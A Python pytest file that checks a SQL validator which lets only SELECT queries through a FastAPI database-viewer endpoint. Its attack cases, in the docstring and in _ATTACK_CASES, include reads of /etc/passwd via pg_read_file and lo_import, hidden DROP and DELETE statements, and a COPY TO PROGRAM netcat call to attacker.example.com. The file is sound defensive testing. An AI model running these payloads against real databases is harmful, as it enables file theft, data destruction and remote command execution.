"""FastAPI integration-style tests for POST /api/pg-viewer/sql (T-037).

Strategy
--------
We cannot boot the full FastAPI app in this environment (missing passlib,
sqlalchemy, redis, psycopg). Instead we follow the same pattern used by the
existing tests (test_router.py, test_sql_validator.py): direct-load the
relevant modules and exercise the exact logic path that the router uses.

Two complementary test layers:

Layer A — Validator-to-HTTP mapping (simulates what the router does)
    Load validate_select_sql (same as test_sql_validator.py) and verify that
    each attack input raises the correct exception type.  Then verify the
    router's exception→HTTP mapping table (lines 752-769 of pg_viewer.py)
    maps each exception to HTTP 400 with the detail = str(exc).
    This is equivalent to a POST /sql integration test without a live server.

Layer B — TestClient endpoint test (uses starlette.testclient)
    Build a minimal FastAPI app that contains ONLY the /sql POST handler logic
    (bypassing the router file's module-level imports that need passlib).
    This gives us true HTTP-level assertions (status code, JSON body).

Coverage
--------
* T-020 acceptance cases (happy path, input validation)
* T-016 validator acceptance cases
* Bypass attempts (11 attack scenarios):
  1.  Comment-hidden DROP:           /* hidden */ DROP TABLE users
  2.  Line-comment hidden DROP:      -- DROP\\nSELECT 1
  3.  CTE-headed DELETE write:       WITH foo AS (DELETE FROM users RETURNING *) SELECT * FROM foo
  4.  Multi-statement via semicolon: SELECT 1; SELECT 2
  5.  pg_sleep DoS:                  SELECT pg_sleep(30)
  6.  dblink_exec OOB:               SELECT dblink_exec('DROP TABLE users')
  7.  lo_import LFI:                 SELECT lo_import('/etc/passwd')
  8.  pg_read_file LFI:              SELECT pg_read_file('/etc/passwd')
  9.  COPY TO PROGRAM RCE:           COPY (SELECT 1) TO PROGRAM 'nc attacker.example.com 1337'
  10. SECURITY LABEL privilege:       SECURITY LABEL FOR provider ON TABLE x IS 'y'
  11. Unicode Cyrillic ЅELECT:        ЅELECT 1

All attack cases must:
  * Raise the appropriate exception from validate_select_sql (Layer A)
  * Return HTTP 400 with a matching detail string (Layer B)

Rate-limit case (31 requests → 429)
------------------------------------
xfail: T-014.6 is not yet wired in the /sql router handler.
See pg_viewer.py line 747: ``# Rate limit stub — TODO: wire T-014.6``.

Run::
    pytest backend/tests/pg_viewer/test_sql_endpoint.py -v
    pytest backend/tests/pg_viewer/test_sql_endpoint.py -v -k "attack"
"""
from __future__ import annotations

import importlib
import importlib.util
import json
import os
import sys
import types
from unittest.mock import MagicMock

import pytest


# ---------------------------------------------------------------------------
# Path setup
# ---------------------------------------------------------------------------
_BACKEND_DIR = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "..", "..")
)
if _BACKEND_DIR not in sys.path:
    sys.path.insert(0, _BACKEND_DIR)


# ---------------------------------------------------------------------------
# Minimal fake config (same pattern as test_sql_validator.py)
# ---------------------------------------------------------------------------

def _install_fake_config(row_limit: int = 1000, sql_max_len: int = 8000) -> None:
    if "app.config" in sys.modules:
        return
    if "app" not in sys.modules:
        sys.modules["app"] = types.ModuleType("app")

    fake_settings = MagicMock()
    fake_settings.pg_viewer_row_limit = row_limit
    fake_settings.pg_viewer_sql_max_len = sql_max_len
    fake_settings.pg_viewer_enabled = True

    fake_config = types.ModuleType("app.config")
    fake_config.get_settings = lambda: fake_settings  # type: ignore[attr-defined]
    sys.modules["app.config"] = fake_config


_install_fake_config()


# ---------------------------------------------------------------------------
# Load sql_validator (pure function — same approach as test_sql_validator.py)
# ---------------------------------------------------------------------------

def _load_sql_validator():
    mod_name = "app.services.pg_viewer.sql_validator"
    if mod_name in sys.modules:
        return sys.modules[mod_name]
    # Ensure package hierarchy
    for pkg in ("app.services", "app.services.pg_viewer"):
        if pkg not in sys.modules:
            m = types.ModuleType(pkg)
            m.__path__ = []
            sys.modules[pkg] = m
    path = os.path.join(_BACKEND_DIR, "app/services/pg_viewer/sql_validator.py")
    spec = importlib.util.spec_from_file_location(mod_name, path)
    mod = importlib.util.module_from_spec(spec)  # type: ignore[arg-type]
    sys.modules[mod_name] = mod
    spec.loader.exec_module(mod)  # type: ignore[union-attr]
    return mod


_sv = _load_sql_validator()

validate_select_sql = _sv.validate_select_sql
EmptyInputError = _sv.EmptyInputError
TooLongError = _sv.TooLongError
MultiStatementError = _sv.MultiStatementError
NotSelectError = _sv.NotSelectError
ForbiddenKeywordError = _sv.ForbiddenKeywordError
ForbiddenFunctionError = _sv.ForbiddenFunctionError
LimitExceededError = _sv.LimitExceededError
ParseError = _sv.ParseError


# ---------------------------------------------------------------------------
# Router exception→HTTP mapping (mirrors pg_viewer.py lines 752-769)
# ---------------------------------------------------------------------------
# The router catches these exception types and raises HTTPException(400, detail=str(exc))
_VALIDATOR_EXCEPTIONS = (
    EmptyInputError,
    TooLongError,
    MultiStatementError,
    NotSelectError,
    ForbiddenKeywordError,
    ForbiddenFunctionError,
    LimitExceededError,
    ParseError,
)


def _simulate_post_sql(sql: str) -> tuple[int, str]:
    """Simulate what POST /api/pg-viewer/sql does for the validation path.

    Returns (http_status, detail_string).
    Status 200 means validator accepted (DB execution would follow; we stop here).
    Status 400 means validator rejected.
    """
    try:
        validate_select_sql(sql, max_len=8000)
        return 200, ""
    except _VALIDATOR_EXCEPTIONS as exc:
        return 400, str(exc)


# ===========================================================================
# Layer A — Validator-to-HTTP mapping tests
# ===========================================================================

class TestHappyPath:
    """Valid SELECT statements must pass validation (status 200 in simulation)."""

    def test_select_1_accepted(self):
        status, _ = _simulate_post_sql("SELECT 1")
        assert status == 200

    def test_select_with_limit_accepted(self):
        status, _ = _simulate_post_sql(
            "SELECT * FROM information_schema.tables LIMIT 5"
        )
        assert status == 200

    def test_cte_select_accepted(self):
        status, _ = _simulate_post_sql(
            "WITH cte AS (SELECT 1) SELECT * FROM cte"
        )
        assert status == 200

    def test_trailing_semicolon_accepted(self):
        """Single trailing ';' is stripped and accepted."""
        status, _ = _simulate_post_sql("SELECT 1;")
        assert status == 200


class TestInputValidation:
    """Input-bound cases that the router maps to 400 or 422."""

    def test_empty_sql_rejected(self):
        """Empty/whitespace input → EmptyInputError → 400."""
        status, detail = _simulate_post_sql("   ")
        assert status == 400
        assert "empty" in detail.lower()

    def test_sql_too_long_rejected(self):
        """SQL > 8000 chars → TooLongError → 400."""
        status, detail = _simulate_post_sql("x" * 8001)
        assert status == 400
        assert "too long" in detail.lower() or "8001" in detail

    def test_not_select_rejected(self):
        """Non-SELECT/WITH statement → NotSelectError → 400."""
        status, detail = _simulate_post_sql("EXPLAIN SELECT 1")
        assert status == 400
        assert "only SELECT" in detail or "only select" in detail.lower()

    def test_limit_exceeded_rejected(self):
        """User LIMIT > 1000 → LimitExceededError → 400."""
        status, detail = _simulate_post_sql("SELECT * FROM t LIMIT 5000")
        assert status == 400
        assert "limit" in detail.lower()

    def test_multi_statement_rejected(self):
        """Two statements → MultiStatementError → 400."""
        status, detail = _simulate_post_sql("SELECT 1; SELECT 2")
        assert status == 400
        assert "multiple statements" in detail

    def test_psql_meta_command_rejected(self):
        r"""\\copy (psql meta-command) → ParseError → 400."""
        status, detail = _simulate_post_sql(r"\copy (SELECT 1) TO '/tmp/x'")
        assert status == 400
        assert "parse error" in detail.lower() or "psql" in detail.lower()


# ===========================================================================
# Attack-surface tests (Layer A + Layer B combined)
# ===========================================================================

# (test_id, sql, expected_exception_type, expected_detail_fragment)
_ATTACK_CASES = [
    (
        "comment_hidden_drop",
        "/* hidden */ DROP TABLE users",
        ForbiddenKeywordError,
        "forbidden keyword",
    ),
    (
        "line_comment_drop",
        "-- DROP\nSELECT 1",
        ForbiddenKeywordError,
        "forbidden keyword",
    ),
    (
        "cte_delete_write",
        "WITH foo AS (DELETE FROM users RETURNING *) SELECT * FROM foo",
        ForbiddenKeywordError,
        "forbidden keyword",
    ),
    (
        "multi_statement_semicolon",
        "SELECT 1; SELECT 2",
        MultiStatementError,
        "multiple statements",
    ),
    (
        "pg_sleep_dos",
        "SELECT pg_sleep(30)",
        ForbiddenFunctionError,
        "forbidden function",
    ),
    (
        "dblink_exec_oob",
        "SELECT dblink_exec('DROP TABLE users')",
        ForbiddenFunctionError,
        "forbidden function",
    ),
    (
        "lo_import_lfi",
        "SELECT lo_import('/etc/passwd')",
        ForbiddenFunctionError,
        "forbidden function",
    ),
    (
        "pg_read_file_lfi",
        "SELECT pg_read_file('/etc/passwd')",
        ForbiddenFunctionError,
        "forbidden function",
    ),
    (
        "copy_to_program_rce",
        "COPY (SELECT 1) TO PROGRAM 'nc attacker.example.com 1337'",
        ForbiddenKeywordError,
        "forbidden keyword",
    ),
    (
        "security_label_priv",
        "SECURITY LABEL FOR provider ON TABLE x IS 'y'",
        ForbiddenKeywordError,
        "forbidden keyword",
    ),
    (
        "unicode_cyrillic_select",
        "ЅELECT 1",
        NotSelectError,
        "only SELECT",
    ),
]


@pytest.mark.parametrize(
    "test_id,sql,exc_type,expected_detail_fragment",
    _ATTACK_CASES,
    ids=[c[0] for c in _ATTACK_CASES],
)
def test_attack_raises_correct_exception(test_id, sql, exc_type, expected_detail_fragment):
    """Layer A: validate_select_sql raises the expected exception type."""
    with pytest.raises(exc_type) as exc_info:
        validate_select_sql(sql)
    detail = str(exc_info.value)
    assert expected_detail_fragment.lower() in detail.lower(), (
        f"[{test_id}] Expected detail containing {expected_detail_fragment!r}, got: {detail!r}"
    )


@pytest.mark.parametrize(
    "test_id,sql,exc_type,expected_detail_fragment",
    _ATTACK_CASES,
    ids=[c[0] for c in _ATTACK_CASES],
)
def test_attack_maps_to_http_400(test_id, sql, exc_type, expected_detail_fragment):
    """Layer A+router mapping: _simulate_post_sql returns HTTP 400 for every attack."""
    status, detail = _simulate_post_sql(sql)
    assert status == 400, (
        f"[{test_id}] Expected HTTP 400, got {status}. Detail: {detail!r}"
    )
    assert expected_detail_fragment.lower() in detail.lower(), (
        f"[{test_id}] Expected detail containing {expected_detail_fragment!r}, got: {detail!r}"
    )


# ===========================================================================
# Layer B — Minimal TestClient endpoint test
# ===========================================================================
# We build a slim FastAPI app that replicates the exact /sql validation path
# (validator call → exception → HTTPException(400)) without importing the
# full pg_viewer.py router (which would pull in passlib / sqlalchemy).

def _build_slim_sql_app():
    """Build a minimal FastAPI app with only the /sql validation path."""
    from fastapi import Body, FastAPI, HTTPException  # noqa: PLC0415

    slim_app = FastAPI()

    @slim_app.post("/api/pg-viewer/sql")
    async def _sql_endpoint(sql: str = Body(..., min_length=1, max_length=8000, embed=True)) -> dict:
        try:
            validate_select_sql(sql, max_len=8000)
        except _VALIDATOR_EXCEPTIONS as exc:
            raise HTTPException(status_code=400, detail=str(exc))
        # Happy-path stub — return minimal valid SqlResult shape
        return {
            "columns": [{"name": "?column?", "data_type": "integer"}],
            "rows": [{"?column?": 1}],
            "row_count": 1,
            "elapsed_ms": 1.0,
            "truncated": False,
            "notice": "LIMIT 1000 auto-applied by server",
        }

    return slim_app


@pytest.fixture()
def slim_client():
    """TestClient for the slim /sql endpoint (no DB, no auth)."""
    from starlette.testclient import TestClient  # noqa: PLC0415

    with TestClient(_build_slim_sql_app()) as c:
        yield c


def _post(slim_client, sql: str):
    return slim_client.post(
        "/api/pg-viewer/sql",
        json={"sql": sql},
        headers={"Content-Type": "application/json"},
    )


class TestEndpointHappyPath:
    """Layer B happy-path tests via TestClient."""

    def test_select_1_returns_200(self, slim_client):
        resp = _post(slim_client, "SELECT 1")
        assert resp.status_code == 200, resp.text
        data = resp.json()
        for key in ("columns", "rows", "row_count", "elapsed_ms", "truncated"):
            assert key in data, f"Missing key: {key}"

    def test_cte_returns_200(self, slim_client):
        resp = _post(slim_client, "WITH cte AS (SELECT 1) SELECT * FROM cte")
        assert resp.status_code == 200, resp.text

    def test_missing_sql_returns_422(self, slim_client):
        resp = slim_client.post(
            "/api/pg-viewer/sql",
            json={},
            headers={"Content-Type": "application/json"},
        )
        assert resp.status_code == 422, resp.text

    def test_sql_too_long_returns_422_or_400(self, slim_client):
        """Pydantic max_length=8000 → 422; TooLongError → 400 (belt+suspenders)."""
        resp = _post(slim_client, "x" * 8001)
        assert resp.status_code in (400, 422), resp.text


@pytest.mark.parametrize(
    "test_id,sql,exc_type,expected_detail_fragment",
    _ATTACK_CASES,
    ids=[c[0] for c in _ATTACK_CASES],
)
def test_attack_endpoint_returns_400(slim_client, test_id, sql, exc_type, expected_detail_fragment):
    """Layer B: POST /api/pg-viewer/sql returns HTTP 400 for every attack SQL."""
    resp = _post(slim_client, sql)
    assert resp.status_code == 400, (
        f"[{test_id}] Expected 400, got {resp.status_code}. Body: {resp.text!r}"
    )
    detail = resp.json().get("detail", "")
    assert expected_detail_fragment.lower() in detail.lower(), (
        f"[{test_id}] Expected detail containing {expected_detail_fragment!r}, got: {detail!r}"
    )


# ===========================================================================
# Validator detail string spot-checks (Layer A)
# ===========================================================================

class TestDetailStrings:
    """Verify the detail messages contain the right vocabulary for UI display."""

    def test_forbidden_keyword_detail_contains_keyword_name(self):
        status, detail = _simulate_post_sql("DELETE FROM users")
        assert status == 400
        assert "forbidden keyword" in detail
        assert "DELETE" in detail

    def test_forbidden_function_detail_contains_function_name(self):
        status, detail = _simulate_post_sql("SELECT pg_sleep(30)")
        assert status == 400
        assert "forbidden function" in detail
        assert "pg_sleep" in detail

    def test_multi_statement_detail_text(self):
        status, detail = _simulate_post_sql("SELECT 1; DROP TABLE users")
        assert status == 400
        assert "multiple statements" in detail

    def test_unicode_cyrillic_maps_to_not_select(self):
        status, detail = _simulate_post_sql("ЅELECT 1")
        assert status == 400
        # NotSelectError message is: "only SELECT (or WITH … SELECT) statements are allowed"
        assert "only SELECT" in detail or "only select" in detail.lower()

    def test_limit_exceeded_detail_contains_cap(self):
        status, detail = _simulate_post_sql("SELECT * FROM t LIMIT 5000")
        assert status == 400
        # LimitExceededError: "row limit exceeded (server-side cap 1000); got 5000"
        assert "1000" in detail or "limit" in detail.lower()

    def test_cte_delete_detail_says_delete(self):
        status, detail = _simulate_post_sql(
            "WITH foo AS (DELETE FROM users RETURNING *) SELECT * FROM foo"
        )
        assert status == 400
        assert "DELETE" in detail


# ===========================================================================
# Router exception-mapping contract (static verification)
# ===========================================================================

class TestRouterExceptionMapping:
    """Verify that the router source catches exactly the expected exceptions."""

    def test_router_catches_all_validator_exceptions(self):
        """The router pg_viewer.py must catch all 8 validator exception types."""
        router_path = os.path.join(_BACKEND_DIR, "app/routers/pg_viewer.py")
        with open(router_path) as fh:
            source = fh.read()

        expected_exception_names = [
            "EmptyInputError",
            "TooLongError",
            "MultiStatementError",
            "NotSelectError",
            "ForbiddenKeywordError",
            "ForbiddenFunctionError",
            "LimitExceededError",
            "ParseError",
        ]
        for exc_name in expected_exception_names:
            assert exc_name in source, (
                f"Router does not import/catch {exc_name} — "
                "HTTP 400 mapping will be missing for this exception type."
            )

    def test_router_raises_400_for_validator_errors(self):
        """The router must raise HTTPException(400) for validator exceptions."""
        router_path = os.path.join(_BACKEND_DIR, "app/routers/pg_viewer.py")
        with open(router_path) as fh:
            source = fh.read()

        # The router does: raise HTTPException(status_code=400, detail=msg)
        assert "status_code=400" in source, (
            "Router does not raise 400 — validator errors would return wrong status."
        )

    def test_rate_limit_not_wired_in_router(self):
        """Verify T-014.6 is not yet wired (justifies the xfail test below)."""
        router_path = os.path.join(_BACKEND_DIR, "app/routers/pg_viewer.py")
        with open(router_path) as fh:
            source = fh.read()

        # The stub comment must exist
        assert "Rate limit stub" in source or "TODO: wire T-014.6" in source, (
            "T-014.6 rate limiter appears to have been wired — "
            "update the xfail test and this assertion."
        )


# ===========================================================================
# Rate-limit endpoint test — xfail (T-014.6 not wired)
# ===========================================================================

@pytest.mark.xfail(
    reason=(
        "T-014.6 rate limiter is not yet wired into POST /sql. "
        "See pg_viewer.py: '# Rate limit stub — TODO: wire T-014.6 rate limiter when it lands'. "
        "When wired, remove this xfail marker and the assertion in "
        "TestRouterExceptionMapping.test_rate_limit_not_wired_in_router."
    ),
    strict=False,
)
def test_31st_request_returns_429(slim_client):
    """Send 31 requests in sequence; the 31st must return HTTP 429.

    xfail because T-014.6 has not been merged into the /sql endpoint.
    When it is, the slim_client fixture will also need to wire the rate limiter.
    """
    for i in range(30):
        resp = _post(slim_client, "SELECT 1")
        assert resp.status_code == 200, f"Request {i + 1} failed: {resp.status_code}"

    resp_31 = _post(slim_client, "SELECT 1")
    assert resp_31.status_code == 429, (
        f"Expected 429 on 31st request, got {resp_31.status_code}. "
        "Remove xfail once T-014.6 is wired."
    )
    assert "rate limit" in resp_31.json().get("detail", "").lower()
